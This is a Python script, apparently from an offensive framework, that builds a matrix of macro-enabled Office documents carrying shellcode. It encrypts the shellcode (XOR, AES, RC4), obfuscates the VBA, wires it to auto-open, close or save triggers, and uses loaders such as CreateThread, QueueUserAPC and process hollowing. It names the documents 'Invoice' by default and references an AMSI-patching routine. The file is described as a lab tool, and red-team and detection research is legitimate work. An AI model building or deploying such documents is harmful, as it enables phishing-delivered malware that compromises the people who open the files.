#!/usr/bin/env python3
"""
MalDoc Build Matrix
====================
Generates every (loader × trigger × format) combination from a single raw
shellcode .bin file.  Designed for lab testing of all VBA injection methods.

Usage
-----
    python maldoc_matrix.py <shellcode.bin> [options]

    # All combinations, XOR encryption, obfuscated:
    python maldoc_matrix.py tcp_4443.bin -o out/

    # Only injection-method axis (fix trigger + format):
    python maldoc_matrix.py tcp_4443.bin --triggers AutoOpen --formats xlsm

    # AES-CBC, custom key, no obfuscation:
    python maldoc_matrix.py tcp_4443.bin -e aes_cbc -k MySecretKey16byt --no-obfuscate

    # AddressOfEntryPoint only, all triggers, xlsm+docm:
    python maldoc_matrix.py tcp_4443.bin --loaders process_hollowing --formats xlsm docm

Matrix dimensions
-----------------
    Loaders  : createthread | enumlocales | queueuserapc | process_hollowing
               createthread      - VirtualAlloc(RW) + CreateThread
               enumlocales       - EnumSystemLocalesA callback
               queueuserapc      - Self-APC via SleepEx(0,1)
               process_hollowing - AddressOfEntryPoint overwrite (no RWX)
    Triggers : AutoOpen | OnClose | OnSave
    Formats  : xlsm | xlam | docm | pptm | ppam
               (pptm/ppam use their own triggers; process_hollowing is Excel/Word only)
"""

import os
import re
import sys
import json
import shutil
import argparse
import subprocess
import tempfile
import zipfile
from pathlib import Path
from datetime import datetime, timezone
from typing import Optional

# ---------------------------------------------------------------------------
# Path setup - allow running from any CWD
# ---------------------------------------------------------------------------

_SCRIPT_DIR = Path(__file__).resolve().parent          # erebus_wrapper/
_SHELLCRYPT  = _SCRIPT_DIR / "agent_code" / "shellcrypt" / "shellcrypt.py"

# Make the package importable without install
if str(_SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(_SCRIPT_DIR))

# ---------------------------------------------------------------------------
# Matrix configuration
# ---------------------------------------------------------------------------

LOADERS: dict[str, str] = {
    "createthread":      "VirtualAlloc + CreateThread",
    "enumlocales":       "EnumSystemLocalesA Callback",
    "queueuserapc":      "QueueUserAPC (Self-APC)",
    "process_hollowing": "AddressOfEntryPoint Injection",
}

TRIGGERS: list[str] = ["AutoOpen", "OnClose", "OnSave"]

# fmt → (extension, host_app, notes)
FORMATS: dict[str, tuple[str, str, str]] = {
    "xlsm": (".xlsm", "excel", "Excel macro workbook"),
    "xlam": (".xlam", "excel", "Excel add-in - persists across sessions"),
    "docm": (".docm", "word",  "Word macro document"),
    "pptm": (".pptm", "ppt",   "PowerPoint macro presentation"),
    "ppam": (".ppam", "ppt",   "PowerPoint add-in - persists across sessions"),
}

# PPT formats don't use loader-controlled triggers (they have their own)
_PPT_FORMATS = {"pptm", "ppam"}

# Process-hollowing spawns a child process - not applicable to PPT host
_NO_HOLLOW_FORMATS = _PPT_FORMATS

# Regex that matches ALL Excel/Word auto-exec trigger subs so they can be
# stripped before PPT VBA assembly (PPT needs Auto_Open/Presentation_Open).
_XL_TRIGGER_RE = re.compile(
    r'^Sub\s+(?:AutoOpen|Auto_Close|Auto_Save|Workbook_Open'
    r'|Workbook_BeforeClose|Workbook_BeforeSave'
    r'|Document_Open|Document_Close|Document_BeforeSave)\s*\(.*?^End Sub[ \t]*$',
    re.MULTILINE | re.DOTALL,
)

ENCRYPTION_MAP: dict[str, str] = {
    "xor":     "xor",
    "aes_ecb": "aes_ecb",
    "aes_cbc": "aes_cbc",
    "rc4":     "rc4",
}

# ---------------------------------------------------------------------------
# Shellcrypt helper
# ---------------------------------------------------------------------------

def _make_ppt_vba(xl_vba: str) -> str:
    """Strip Excel trigger subs and inject PPT-native Auto_Open/Presentation_Open."""
    cleaned = _XL_TRIGGER_RE.sub('', xl_vba).rstrip()
    return (
        cleaned + "\n\n"
        "Sub Auto_Open()\n"
        "    ExecutePayload\n"
        "End Sub\n\n"
        "Sub Presentation_Open()\n"
        "    ExecutePayload\n"
        "End Sub\n"
    )


def _shellcrypt(shellcode: Path, encryption: str, key: Optional[str],
                out_file: Path) -> None:
    """Run shellcrypt to produce a -f vba source file."""
    cmd = [
        sys.executable, str(_SHELLCRYPT),
        "-i", str(shellcode),
        "-e", encryption,
        "-f", "vba",
        "-a", "shellcode",
        "-o", str(out_file),
    ]
    if key:
        cmd += ["-k", key]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(
            f"shellcrypt exited {result.returncode}:\n{result.stderr or result.stdout}"
        )


# ---------------------------------------------------------------------------
# Build pipeline
# ---------------------------------------------------------------------------

def build_matrix(
    shellcode_path: Path,
    output_dir: Path,
    doc_name: str = "Invoice",
    encryption: str = "xor",
    enc_key: Optional[str] = None,
    loaders: Optional[list[str]] = None,
    triggers: Optional[list[str]] = None,
    formats: Optional[list[str]] = None,
    obfuscate: bool = True,
    target_process: str = r"C:\Windows\System32\notepad.exe",
    export_bas: bool = True,
    zip_output: bool = False,
    helper_path: Optional[Path] = None,
) -> dict:
    """
    Build the full (or filtered) maldoc matrix.

    Returns the manifest dict.  Also writes:
        <output_dir>/<loader>/<name>_<loader>_<trigger><ext>
        <output_dir>/<loader>/bas/<name>_<loader>_<trigger>.bas   (if export_bas)
        <output_dir>/MANIFEST.json
        <output_dir>/MANIFEST.txt
        <output_dir>/erebus_helper.py                             (if helper_path provided)
        <output_dir>/build_matrix_com.bat
        <output_dir>.zip                                          (if zip_output)
    """
    from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin

    loaders  = loaders  or list(LOADERS.keys())
    triggers = triggers or list(TRIGGERS)
    formats  = formats  or list(FORMATS.keys())

    output_dir.mkdir(parents=True, exist_ok=True)

    # ------------------------------------------------------------------
    # Step 1 - run shellcrypt once to get VBA array source
    # ------------------------------------------------------------------
    print(f"[*] Shellcrypt  : {shellcode_path.name}  enc={encryption}")
    vba_fd, vba_tmp = tempfile.mkstemp(suffix=".vba")
    os.close(vba_fd)
    try:
        _shellcrypt(shellcode_path, encryption, enc_key, Path(vba_tmp))
        vba_shellcode_src = Path(vba_tmp).read_text(encoding="utf-8", errors="replace")
    finally:
        try:
            os.unlink(vba_tmp)
        except OSError:
            pass

    print(f"[*] VBA source  : {len(vba_shellcode_src):,} bytes")

    plugin = PayloadMalDocsPlugin()

    manifest = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "shellcode":    str(shellcode_path),
        "encryption":   encryption,
        "obfuscate":    obfuscate,
        "target_process": target_process,
        "entries":      [],
    }

    ok_count = fail_count = 0

    # ------------------------------------------------------------------
    # Step 2 - for each (loader, trigger, format) triple, generate + save
    # ------------------------------------------------------------------
    for loader in loaders:
        loader_dir = output_dir / loader
        loader_dir.mkdir(exist_ok=True)
        if export_bas:
            (loader_dir / "bas").mkdir(exist_ok=True)

        for trigger in triggers:
            # ---- VBA generation (per loader × trigger) ----------------
            # Word formats use the word-aware loader generator so that
            # Document_Open / Document_Close triggers are correct.
            # Excel/PPT formats use generate_shellcode_injection_vba.

            try:
                # Excel VBA (also used for PPT - triggers are overridden there)
                xl_vba = plugin.generate_shellcode_injection_vba(
                    vba_shellcode=vba_shellcode_src,
                    trigger_type=trigger,
                    loader_type=loader,
                    target_process=target_process,
                )
                if obfuscate:
                    xl_vba = plugin.obfuscate_vba(xl_vba)

                # Word VBA (separate generator for Word-native event subs)
                wd_vba = plugin.generate_word_vba_loader(
                    vba_shellcode=vba_shellcode_src,
                    trigger_type=trigger,
                    loader_type=loader,
                    target_process=target_process,
                )
                if obfuscate:
                    wd_vba = plugin.obfuscate_vba(wd_vba)

            except Exception as exc:
                reason = f"VBA gen error: {exc}"
                print(f"  [!] {loader}/{trigger}: {reason}")
                for fmt in formats:
                    manifest["entries"].append(_entry(
                        loader, trigger, fmt, None, "FAIL", reason
                    ))
                    fail_count += 1
                continue

            stem = f"{doc_name}_{loader}_{trigger}"

            # Export .bas sidecars once per (loader × trigger):
            #   <stem>_xl.bas  - Excel/PPT VBA
            #   <stem>_wd.bas  - Word VBA (word-native event subs)
            if export_bas:
                try:
                    plugin.export_vba_as_bas(
                        vba_code=xl_vba,
                        output_path=str(loader_dir / "bas" / f"{stem}_xl.bas"),
                        module_name=stem,
                    )
                    plugin.export_vba_as_bas(
                        vba_code=wd_vba,
                        output_path=str(loader_dir / "bas" / f"{stem}_wd.bas"),
                        module_name=stem,
                    )
                except Exception as exc:
                    print(f"  [!] .bas export ({stem}): {exc}")

            # ---- Document assembly (per format) -----------------------
            for fmt in formats:
                ext, host, _ = FORMATS[fmt]
                out_path = loader_dir / f"{stem}{ext}"

                # Process hollowing spawns a child process - not meaningful
                # inside PowerPoint's VBA host.
                if fmt in _NO_HOLLOW_FORMATS and loader == "process_hollowing":
                    reason = "process_hollowing not applicable to PPT host"
                    print(f"  [-] {out_path.name} - skipped ({reason})")
                    manifest["entries"].append(_entry(
                        loader, trigger, fmt, None, "SKIP", reason
                    ))
                    continue

                try:
                    if host == "excel":
                        plugin.generate_excel_payload(
                            payload_path=str(out_path),
                            vba_payload=xl_vba,
                            output_path=str(out_path),
                        )
                    elif host == "word":
                        plugin.generate_word_payload(
                            payload_path=str(out_path),
                            vba_payload=wd_vba,
                            output_path=str(out_path),
                        )
                    elif host == "ppt":
                        # Strip Excel-specific trigger subs; add PPT-native ones.
                        # create_pptm_payload's auto-detect would otherwise find
                        # PatchAmsi as the first Sub and wire the wrong entry point.
                        ppt_vba = _make_ppt_vba(xl_vba)
                        if fmt == "ppam":
                            plugin.create_ppam_payload(
                                vba_source=ppt_vba,
                                output_path=str(out_path),
                            )
                        else:
                            plugin.create_pptm_payload(
                                vba_source=ppt_vba,
                                output_path=str(out_path),
                            )

                    size = out_path.stat().st_size
                    print(f"  [+] {out_path.relative_to(output_dir)}  ({size:,} B)")
                    manifest["entries"].append(_entry(
                        loader, trigger, fmt,
                        str(out_path.relative_to(output_dir)),
                        "OK", None, size,
                    ))
                    ok_count += 1

                except Exception as exc:
                    reason = str(exc)
                    print(f"  [!] {out_path.name}: {reason}")
                    manifest["entries"].append(_entry(
                        loader, trigger, fmt, None, "FAIL", reason
                    ))
                    fail_count += 1

    # ------------------------------------------------------------------
    # Step 3 - write manifest + summary
    # ------------------------------------------------------------------
    _write_manifest(output_dir, manifest, ok_count, fail_count)

    # ------------------------------------------------------------------
    # Step 4 - embed erebus_helper.py (makes the matrix folder self-contained)
    # ------------------------------------------------------------------
    if helper_path and helper_path.exists():
        shutil.copy2(str(helper_path), str(output_dir / "erebus_helper.py"))
        print(f"[*] Helper  : erebus_helper.py  ({helper_path.stat().st_size:,} B)")

    # ------------------------------------------------------------------
    # Step 5 - write Windows COM re-injection bat
    # ------------------------------------------------------------------
    com_bat = _write_com_bat(output_dir, manifest, doc_name)
    print(f"[*] COM bat : {com_bat.name}  ({com_bat.stat().st_size:,} B)")

    total = ok_count + fail_count
    print(f"\n[*] Complete - {ok_count}/{total} OK, {fail_count} failed")
    print(f"[*] Output: {output_dir.resolve()}")

    # ------------------------------------------------------------------
    # Step 6 - optional ZIP
    # ------------------------------------------------------------------
    if zip_output:
        zip_path = output_dir.with_suffix(".zip")
        _pack_zip(output_dir, manifest, zip_path)
        print(f"[*] Zipped: {zip_path}  ({zip_path.stat().st_size:,} B)")

    return manifest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _entry(loader, trigger, fmt, rel_path, status, reason=None, size=None):
    e = {
        "loader":   loader,
        "trigger":  trigger,
        "format":   fmt,
        "file":     rel_path,
        "status":   status,
    }
    if reason:
        e["reason"] = reason
    if size is not None:
        e["size"] = size
    return e


def _write_manifest(output_dir: Path, manifest: dict, ok: int, fail: int) -> None:
    # JSON
    (output_dir / "MANIFEST.json").write_text(
        json.dumps(manifest, indent=2), encoding="utf-8"
    )

    # Human-readable table
    lines = [
        "MalDoc Build Matrix",
        "=" * 72,
        f"Generated : {manifest['generated_at']}",
        f"Shellcode : {manifest['shellcode']}",
        f"Encryption: {manifest['encryption']}  Obfuscate: {manifest['obfuscate']}",
        f"Target    : {manifest['target_process']}",
        "",
        f"{'Loader':<20} {'Trigger':<10} {'Format':<6} {'Status':<6} {'File'}",
        "-" * 72,
    ]
    for e in manifest["entries"]:
        lines.append(
            f"{e['loader']:<20} {e['trigger']:<10} {e['format']:<6} "
            f"{e['status']:<6} {e.get('file') or e.get('reason', '')}"
        )
    lines += [
        "",
        f"Total: {ok + fail}  OK: {ok}  Failed/Skipped: {fail}",
    ]
    (output_dir / "MANIFEST.txt").write_text("\n".join(lines), encoding="utf-8")


def _write_com_bat(output_dir: Path, manifest: dict, doc_name: str) -> Path:
    """
    Emit build_matrix_com.bat - one erebus_helper.py call per successfully
    built document.  Run on a Windows host that has Excel/Word installed.

    erebus_helper.py is expected one level up from this bat (payload\erebus_helper.py).
    %~dp0 anchors all paths to the bat file location so it runs from any CWD.

    erebus_helper.py call signature (mirrors the single-doc path):
        python erebus_helper.py <format> --bas-file "<abs>" --output "<abs>" --module-name "<name>"

    For Word formats (docm) the _wd.bas sidecar is used; all others use _xl.bas.
    """
    _FMT_BAS_SUFFIX = {
        "xlsm": "_xl", "xlam": "_xl",
        "pptm": "_xl", "ppam": "_xl",
        "docm": "_wd", "doc":  "_wd",
    }
    lines = [
        "@echo off",
        "REM erebus MalDoc Matrix - Windows COM re-injection via erebus_helper.py",
        "REM Run from any directory - paths resolve relative to this .bat file.",
        "REM Requires Excel / Word installed on the Windows host.",
        "",
        "set MATRIX=%~dp0",
        "set HELPER=%~dp0erebus_helper.py",
        "",
    ]
    for e in manifest["entries"]:
        if e["status"] != "OK" or not e.get("file"):
            continue
        loader  = e["loader"]
        trigger = e["trigger"]
        fmt     = e["format"]
        stem    = f"{doc_name}_{loader}_{trigger}"
        bas_suf = _FMT_BAS_SUFFIX.get(fmt, "_xl")
        bas_rel = f"{loader}\\bas\\{stem}{bas_suf}.bas"
        out_rel = e["file"].replace("/", "\\")
        lines.append(
            f'python "%HELPER%" {fmt}'
            f' --bas-file "%MATRIX%{bas_rel}"'
            f' --output "%MATRIX%{out_rel}"'
            f' --module-name "{stem}"'
        )
    lines += ["", "echo Done.", "pause"]
    bat_path = output_dir / "build_matrix_com.bat"
    bat_path.write_text("\r\n".join(lines), encoding="utf-8")
    return bat_path


def _pack_zip(output_dir: Path, manifest: dict, zip_path: Path) -> None:
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for entry in manifest["entries"]:
            if entry["status"] == "OK" and entry.get("file"):
                full = output_dir / entry["file"]
                if full.exists():
                    zf.write(full, entry["file"])
        for name in ("MANIFEST.json", "MANIFEST.txt", "build_matrix_com.bat", "erebus_helper.py"):
            p = output_dir / name
            if p.exists():
                zf.write(p, name)
        # Include all .bas files
        for bas in output_dir.rglob("*.bas"):
            zf.write(bas, str(bas.relative_to(output_dir)))


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        prog="maldoc_matrix.py",
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("shellcode", type=Path,
                    help="Raw shellcode .bin file (x64 recommended)")
    ap.add_argument("-o", "--output", type=Path, default=Path("maldoc_matrix"),
                    metavar="DIR", help="Output directory  [default: ./maldoc_matrix]")
    ap.add_argument("-n", "--name", default="Invoice", metavar="NAME",
                    help="Document base name  [default: Invoice]")

    # Encryption
    ap.add_argument("-e", "--encryption",
                    choices=list(ENCRYPTION_MAP.keys()), default="xor",
                    help="Shellcode encryption  [default: xor]")
    ap.add_argument("-k", "--key", default=None,
                    help="Encryption key  (optional)")

    # Matrix filters
    ap.add_argument("--loaders", nargs="+", choices=list(LOADERS.keys()),
                    metavar="LOADER",
                    help=f"Loaders to build  [default: all]  choices: {' | '.join(LOADERS)}")
    ap.add_argument("--triggers", nargs="+", choices=TRIGGERS,
                    metavar="TRIGGER",
                    help=f"Triggers to build  [default: all]  choices: {' | '.join(TRIGGERS)}")
    ap.add_argument("--formats", nargs="+", choices=list(FORMATS.keys()),
                    metavar="FORMAT",
                    help=f"Formats to build  [default: all]  choices: {' | '.join(FORMATS)}")

    # Options
    ap.add_argument("--no-obfuscate", action="store_true",
                    help="Skip VBA obfuscation pass")
    ap.add_argument("--no-bas", action="store_true",
                    help="Skip exporting .bas sidecar files")
    ap.add_argument("--target-process", default=r"C:\Windows\System32\notepad.exe",
                    metavar="PATH",
                    help="Sacrificial process for hollowing  [default: notepad.exe]")
    ap.add_argument("--zip", action="store_true",
                    help="Pack output directory into a .zip after build")

    return ap.parse_args()


def main() -> None:
    args = _parse_args()

    if not args.shellcode.exists():
        sys.exit(f"[!] Shellcode not found: {args.shellcode}")

    if not _SHELLCRYPT.exists():
        sys.exit(f"[!] shellcrypt not found: {_SHELLCRYPT}")

    print(f"[*] Shellcode   : {args.shellcode}  ({args.shellcode.stat().st_size} bytes)")
    print(f"[*] Output      : {args.output.resolve()}")
    print(f"[*] Loaders     : {', '.join(args.loaders or list(LOADERS.keys()))}")
    print(f"[*] Triggers    : {', '.join(args.triggers or TRIGGERS)}")
    print(f"[*] Formats     : {', '.join(args.formats or list(FORMATS.keys()))}")
    print(f"[*] Encryption  : {args.encryption}  Key: {'<provided>' if args.key else '<auto>'}")
    print(f"[*] Obfuscate   : {not args.no_obfuscate}")
    print()

    build_matrix(
        shellcode_path  = args.shellcode,
        output_dir      = args.output,
        doc_name        = args.name,
        encryption      = ENCRYPTION_MAP[args.encryption],
        enc_key         = args.key,
        loaders         = args.loaders,
        triggers        = args.triggers,
        formats         = args.formats,
        obfuscate       = not args.no_obfuscate,
        target_process  = args.target_process,
        export_bas      = not args.no_bas,
        zip_output      = args.zip,
    )


if __name__ == "__main__":
    main()
